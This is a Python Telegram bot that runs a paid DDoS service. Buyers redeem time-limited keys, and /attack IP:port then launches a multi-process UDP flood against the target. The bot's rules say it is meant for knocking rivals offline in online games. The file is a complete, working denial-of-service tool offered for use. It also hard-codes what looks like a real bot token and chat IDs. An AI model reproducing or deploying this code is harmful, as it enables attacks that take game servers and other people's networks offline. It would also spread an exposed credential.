import telebot
import socket
import multiprocessing
import random
import time
import subprocess
import sys
import datetime
import logging
import socket
import json  # For working with JSON files
import os  # For file operations
from pytz import timezone
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# File paths for users and keys
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"

# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '8099557329:AAE6pm_ZdfMPROksi4k0ydaA7ZyfF-aW1-o'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [809680839]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}
current_attack_user = None  # Variable to track the user currently running an attack

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port):
    global current_attack_user

    group_chat_id = -1002452271418  # Replace with your group chat ID

    # Check if another attack is running by the same or different user
    if current_attack_user:
        if current_attack_user == user_id:
            bot.send_message(
                group_chat_id,
                f"❌ You already have an active attack running. Please stop it before starting a new one."
            )
        else:
            bot.send_message(
                group_chat_id,
                f"❌ Another user's attack is currently running. Please wait until it is stopped."
            )
        return

    # Set the current attack user
    current_attack_user = user_id
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 500 CPU threads for maximum performance
    for _ in range(min(500, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)

    # Broadcast to the group
    bot.send_message(group_chat_id, f"☢️𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}\n𝐏𝐨𝐫𝐭: {target_port} \n𝐌𝐞𝐭𝐡𝐨𝐝: @kksharma_yt💀")

# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    global current_attack_user

    group_chat_id = -1002452271418  # Replace with your group chat ID

    # Check if the user has any active attacks
    if user_id in user_attacks:
        try:
            processes, stop_flag = user_attacks[user_id]
            stop_flag.set()  # Signal processes to stop

            # Wait for all processes to terminate
            for process in processes:
                if process.is_alive():  # Check if the process is still running
                    process.terminate()
                    process.join(timeout=5)  # Wait 5 seconds for graceful termination

            # Clean up user attack data
            del user_attacks[user_id]
            current_attack_user = None  # Reset current attack user

            # Notify the group that the attack has been stopped
            bot.send_message(group_chat_id, f"🔴 All attacks stopped.")
        except Exception as e:
            # Log and notify about any error during stopping
            logging.error(f"Error stopping attack for user {user_id}: {e}")
            bot.send_message(group_chat_id, f"⚠️ Error occurred while stopping the attack for user {user_id}.")
    else:
        # If no active attack is found
        bot.send_message(group_chat_id, f"❌ No active attack found.")

# 🤝 Helper Functions to Load and Save Data
def load_data(file_path):
    """Load data from a JSON file."""
    if not os.path.exists(file_path):
        return {}
    with open(file_path, "r") as f:
        return json.load(f)

def save_data(file_path, data):
    """Save data to a JSON file."""
    with open(file_path, "w") as f:
        json.dump(data, f, indent=4)

# 📒 Load users and keys from files
ACTIVE_USERS = load_data(USERS_FILE)  # Format: {"user_id": expiration_date}
ACCESS_KEYS = load_data(KEYS_FILE)   # Format: {"key": expiration_date}

# Handler for the "🔑 key" button press
@bot.message_handler(func=lambda message: message.text == '🔑 key')
def handle_key_button(message):
    bot.send_message(
        message.chat.id,
        "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /key <days/hours>"
    )
    
# 🔑 Admin command to generate a key
@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied!\n🔐 Authorized Admins only.")
        return

    try:
        # Parse the command to extract the value and type (days/hours)
        command_parts = message.text.split()
        if len(command_parts) != 3 or command_parts[2] not in ['days', 'hours']:
            raise ValueError("Invalid format")

        duration_value = int(command_parts[1])
        duration_type = command_parts[2]

        # Get the current time in IST
        ist = timezone('Asia/Kolkata')
        current_time = datetime.datetime.now(ist)

        # Calculate expiration time based on the duration type
        if duration_type == 'days':
            expiration_date = current_time + datetime.timedelta(days=duration_value)
        elif duration_type == 'hours':
            expiration_date = current_time + datetime.timedelta(hours=duration_value)
        else:
            raise ValueError("Invalid duration type")

        new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=8))
        ACCESS_KEYS[new_key] = expiration_date.strftime('%Y-%m-%d %H:%M:%S')  # Save as string for JSON serialization
        save_data(KEYS_FILE, ACCESS_KEYS)  # Save updated keys to file

        # Send the key in a tap-to-copy format using Markdown
        bot.send_message(
            message.chat.id,
            f"✅ **Key Generated**\n🔑 **Key**: `{new_key}`\n"
            f"⌛ **Valid Until**: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "📋 *Tap and hold to copy the key*.",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        bot.send_message(
            message.chat.id,
            "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /key <days/hours>")

# Handler for the "🎟️ redeem" button press
@bot.message_handler(func=lambda message: message.text == '🎟️ redeem')
def handle_redeem_button(message):
    # Inform the user about the correct command usage
    bot.send_message(
        message.chat.id,
        "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /redeem <key>"
    )
   
# 🎟️ User command to redeem a key
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)  # Use string for JSON keys
    try:
        user_key = message.text.split()[1]
        # Check if user already has access
        if user_id in ACTIVE_USERS and datetime.datetime.strptime(ACTIVE_USERS[user_id], '%Y-%m-%d %H:%M:%S') > datetime.datetime.now():
            bot.send_message(message.chat.id, "✅ You already have access to the bot.")
            return

        # Check if the key is valid and not expired
        if user_key in ACCESS_KEYS:
            key_expiration = datetime.datetime.strptime(ACCESS_KEYS[user_key], '%Y-%m-%d %H:%M:%S')
            if key_expiration > datetime.datetime.now():
                ACTIVE_USERS[user_id] = ACCESS_KEYS[user_key]  # Grant access
                del ACCESS_KEYS[user_key]  # Remove the key
                save_data(USERS_FILE, ACTIVE_USERS)  # Save updated users to file
                save_data(KEYS_FILE, ACCESS_KEYS)  # Save updated keys to file
                bot.send_message(message.chat.id, f"✅ Access granted until {ACTIVE_USERS[user_id]}! Enjoy!")
            else:
                del ACCESS_KEYS[user_key]  # Remove expired key
                save_data(KEYS_FILE, ACCESS_KEYS)  # Save updated keys to file
                bot.send_message(message.chat.id, "❌ Key has expired. Please contact an admin for a new key.")
        else:
            bot.send_message(message.chat.id, "❌ Invalid or already used key.\nContact an admin for assistance.")
    except IndexError:
        bot.send_message(message.chat.id, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /redeem <key>")      
        
# 🔐 Check user access before processing commands
def check_user_access(user_id):
    """Check if a user has valid access."""
    user_id = str(user_id)  # Use string for JSON keys
    if user_id in ACTIVE_USERS:
        expiration_date = datetime.datetime.strptime(ACTIVE_USERS[user_id], '%Y-%m-%d %H:%M:%S')
        if expiration_date > datetime.datetime.now():
            return True
        else:
            del ACTIVE_USERS[user_id]  # Remove expired user
            save_data(USERS_FILE, ACTIVE_USERS)  # Save updated users to file
    return False

#handler for the "📝 myplan" button press
@bot.message_handler(func=lambda message: message.text == '📝 myplan')
def handle_myplan_button(message):
    user_id = str(message.from_user.id)  # Ensure user ID is a string for dictionary access

    # Check if the user has an active plan
    if user_id in ACTIVE_USERS:
        expiration_date = ACTIVE_USERS[user_id]
        current_time = datetime.datetime.now()
        expiration_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')

        if expiration_datetime > current_time:
            remaining_time = expiration_datetime - current_time
            bot.send_message(
                message.chat.id,
                f"📝 𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 𝐝𝐞𝐭𝐚𝐢𝐥𝐬.\n\n"
                f"🔑 Access Valid Until: {expiration_date}\n"
                f"⏳ Time Remaining: {remaining_time.days} days and {remaining_time.seconds // 3600} hours\n"
                "✅ Enjoy your access!"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ Your plan has expired. Please purchase a new 🔑 key to continue using the bot."
            )
    else:
        bot.send_message(
            message.chat.id,
            "❌ You do not have an active plan. Please purchase a 🔑 key to activate your access."
        )

# 💬 Command handler for /myplan
@bot.message_handler(commands=['myplan'])
def my_plan_details(message):
    user_id = str(message.from_user.id)  # Ensure user ID is a string for dictionary access

    # Check if the user has an active plan
    if user_id in ACTIVE_USERS:
        expiration_date = ACTIVE_USERS[user_id]
        current_time = datetime.datetime.now()
        expiration_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')

        if expiration_datetime > current_time:
            remaining_time = expiration_datetime - current_time
            bot.send_message(
                message.chat.id,
                f"📝 𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 𝐝𝐞𝐭𝐚𝐢𝐥𝐬.\n\n"
                f"🔑 Access Valid Until: {expiration_date}\n"
                f"⏳ Time Remaining: {remaining_time.days} days and {remaining_time.seconds // 3600} hours\n"
                "✅ Enjoy your access!"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ Your plan has expired. Please purchase a new 🔑 key to continue using the bot."
            )
    else:
        bot.send_message(
            message.chat.id,
            "❌ You do not have an active plan. Please purchase a 🔑 key to activate your access."
        )
    
# Handler for the "👨‍💼 all_users" button press
@bot.message_handler(func=lambda message: message.text == '👨‍💼 all_users')
def handle_all_users_button(message):
    admin_id = message.from_user.id

    # Check if the user is an authorized admin
    if admin_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied!\n🔐 Authorized Admins only.")
        return

    # Check if there are any active users
    if not ACTIVE_USERS:
        bot.send_message(message.chat.id, "🔍 No active users found.")
        return

    # Generate a formatted list of active users
    user_list = [
        f"👨‍💼 **User ID:** `{uid}`\n"
        f"   ⌛ **Access Until:** {expiration}"
        for uid, expiration in ACTIVE_USERS.items()
    ]
    response = "📋 **𝐀𝐂𝐓𝐈𝐕𝐄 𝐔𝐒𝐄𝐑𝐒.**\n\n" + "\n\n".join(user_list)

    # Send the list of users to the admin
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

        
# 🧾 Command to List All Users (/all_users)
@bot.message_handler(commands=['all_users'])
def all_users(message):
    """Handler for the /all_users command. Lists all active users."""
    user_id = message.from_user.id
    
    # Check if the user is an authorized admin
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied!\n🔐 Authorized Admins only.")
        return

    # Check if there are any active users
    if not ACTIVE_USERS:
        bot.send_message(message.chat.id, "🔍 No active users found.")
        return

    # Create a formatted list of active users
    user_list = "\n".join(
        [f"👨‍💼 **User ID:** `{uid}`\n"
        f"   ⌛ **Access Until:** {expiration}"
        for uid, expiration in ACTIVE_USERS.items()]
    )
    
    # Send the list to the admin
    bot.send_message(message.chat.id, f"📋 𝐀𝐂𝐓𝐈𝐕𝐄 𝐔𝐒𝐄𝐑𝐒.👨‍💼\n\n{user_list}")

# 🫡 Command to Remove a User (/remove_user)
@bot.message_handler(commands=['remove_user'])
def remove_user(message):
    """Handler for the /remove_user command. Removes a specific user."""
    user_id = message.from_user.id
    
    # Check if the user is an authorized admin
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied!\n🔐 Authorized Admins only..")
        return

    # Parse the user ID to remove
    try:
        target_user_id = message.text.split()[1]  # Get the user ID from the command
    except IndexError:
        bot.send_message(message.chat.id, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /remove_user <user_id>")
        return

    # Remove the user from ACTIVE_USERS
    if target_user_id in ACTIVE_USERS:
        del ACTIVE_USERS[target_user_id]
        save_data(USERS_FILE, ACTIVE_USERS)  # Save updated user list
        bot.send_message(message.chat.id, f"✅ User {target_user_id} has been removed.")
    else:
        bot.send_message(message.chat.id, f"❌ User {target_user_id} not found.")

# Function to send the keyboard
@bot.message_handler(commands=['menu'])
def show_menu(message):
    # Create the keyboard
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    attack_button = KeyboardButton('🔥 attack')
    stop_button = KeyboardButton('🔴 stop')
    generate_key_button = KeyboardButton('🔑 key')
    redeem_key_button = KeyboardButton('🎟️ redeem')
    myplan_button = KeyboardButton('📝 myplan')
    all_users_button = KeyboardButton('👨‍💼 all_users')
    bot_uptime_button = KeyboardButton('🕰️ uptime')
    help_button = KeyboardButton('🤝 help')

    # Add buttons to the keyboard
    markup.add(attack_button, stop_button)
    markup.add(generate_key_button, redeem_key_button)
    markup.add(myplan_button, all_users_button)
    markup.add(bot_uptime_button, help_button)

    # Send the keyboard to the user
    bot.send_message(
        message.chat.id,
        "⚙️ Choose an action from the menu below:",
        reply_markup=markup
    )

#handler for the "🕰️ uptime" button press    
@bot.message_handler(func=lambda message: message.text == '🕰️ uptime')
def handle_uptime_button(message):
    user_id = message.from_user.id
    # Send the bot's uptime
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied!\n🔐 Authorized Admins only.")
    else:
        welcome_message = (
            "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
            "Use /attack `<IP>:<port>` to start an attack, or /stop to halt your attack.\n\n"
            "📜 **Bot Rules - Keep It Cool!** 🌟\n"
            "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
            "2. Limit your kills! 🔫 Stay under 20-30 kills to keep it fair.\n"
            "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
            "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
            "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
            "6. Report issues! 🛡️ Message the owner for any problems.\n"
            "7. Always check your command before executing! ✅\n"
            "8. Do not attack without permission! ❌⚠️\n"
            "9. Be aware of the consequences of your actions! ⚖️\n"
            "10. Stay within the limits and play fair! 🤗\n"
            "💡 Follow the rules and let's enjoy gaming together! 🎉\n"
            "📞 Contact the owner on Instagram and Telegram: @kksharma_yt\n"
            "☠️ To see the Telegram Bot Command type: /help"
            "👤 To find your user ID type: /id"
        )
        bot.send_message(message.chat.id, welcome_message)

# Handler for the "🔥 attack" button press
@bot.message_handler(func=lambda message: message.text == '🔥 attack')
# Handler for the "🔥 attack" button press
@bot.message_handler(func=lambda message: message.text == '🔥 attack')
def handle_attack_button(message):
    user_id = message.from_user.id
    if not check_user_access(user_id):
        # Send message if the user's plan is not active
        bot.send_message(message.chat.id, "❌ Your plan is not active. Please purchase a 🔑 key from admin.")
        return
    # Send the usage message if the plan is active
    bot.send_message(message.chat.id, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <IP>:<port>")
    
# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆ 
# Update other command handlers to enforce access control
@bot.message_handler(commands=['attack'])
def restricted_commands(message):
    user_id = message.from_user.id
    if not check_user_access(user_id):
        bot.send_message(message.chat.id, "❌ Your plan is not active. Please purchase a 🔑 key from admin.")
        return

    # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
    try:
        command = message.text.split()
        target = command[1].split(':')
        target_ip = target[0]
        target_port = int(target[1])
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <IP>:<port>")
        
"""""
    Me             scammer 🏳️‍🌈
 ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
"""""
# Handler for the "🔴 stop" button press
@bot.message_handler(func=lambda message: message.text == '🔴 stop')
def handle_stop_button(message):
    user_id = message.from_user.id

    # Check if the user has an active plan
    if not check_user_access(user_id):
        bot.send_message(message.chat.id, "❌ Your plan is not active. Please purchase a 🔑 key from admin.")
        return

    # If the plan is active, stop the attack
    stop_attack(user_id)

# 💬 Command handler for /stop
# Update other command handlers to enforce access control
@bot.message_handler(commands=['stop'])
def restricted_commands(message):
    user_id = message.from_user.id
    if not check_user_access(user_id):
        bot.send_message(message.chat.id, "❌ Your plan is not active. Please purchase a 🔑 key from admin.")
        return

    stop_attack(user_id)

# 💬 Command handler for /id  
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
                                      f"👥 Your Username is: @{username}")

    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot_owner = "kksharma_yt"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")

# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 20-30 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @kksharma_yt")

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.send_message(message.chat.id, ping_response)
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"
        
# Handler for the "🤝 help" button press
@bot.message_handler(func=lambda message: message.text == '🤝 help')
def help_command(message):
    help_message = (
        "🤔 **Need Help?** 🤔\n"
        "Here are the available commands:\n"
        "🔹 **/start** - Start the bot. 🔋\n"
        "💣 **/attack <IP>:<port>** - Launch a powerful attack. 💥\n"
        "🛑 **/stop** - Stop the attack. 🛑️\n"
        "🔑 **/key** -Admin command to generate a key. 🔑 \n"
        "🎟️ **/redeem** -User command to redeem a key. 🎟️\n"
        "👨‍💼 **/all_users** -User command to show all users. 👨‍💼\n"
        "🫡 **/remove_user** -User command to remove users. 😂\n"
        "⚙️ **/menu** -User command to menu buttons. ⚙️\n"
        "📝 **/myplan** -User command to my plans details. 📝\n"
        "👀 **/id** - Show your user ID. 👤\n"
        "📚 **/rules** - View the bot rules. 📖\n"
        "👑 **/owner** - Contact the owner. 👑\n"
        "⏰ **/uptime** - Get bot uptime. ⏱️\n"
        "📊 **/ping** - Check your connection ping. 📈\n"
        "🤝 **/help** - Show this help message. 🤝"
    )
    bot.send_message(message.chat.id, help_message)

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🤔 **Need Help?** 🤔\n"
        "Here are the available commands:\n"
        "🔹 **/start** - Start the bot. 🔋\n"
        "💣 **/attack <IP>:<port>** - Launch a powerful attack. 💥\n"
        "🛑 **/stop** - Stop the attack. 🛑️\n"
        "🔑 **/key** -Admin command to generate a key. 🔑 \n"
        "🎟️ **/redeem** -User command to redeem a key. 🎟️\n"
        "👨‍💼 **/all_users** -User command to show all users. 👨‍💼\n"
        "🫡 **/remove_user** -User command to remove users. 😂\n"
        "⚙️ **/menu** -User command to menu buttons. ⚙️\n"
        "📝 **/myplan** -User command to my plans details. 📝\n"
        "👀 **/id** - Show your user ID. 👤\n"
        "📚 **/rules** - View the bot rules. 📖\n"
        "👑 **/owner** - Contact the owner. 👑\n"
        "⏰ **/uptime** - Get bot uptime. ⏱️\n"
        "📊 **/ping** - Check your connection ping. 📈\n"
        "🤝 **/help** - Show this help message. 🤝"
    )
    bot.send_message(message.chat.id, help_message)   

#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
"""
**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**

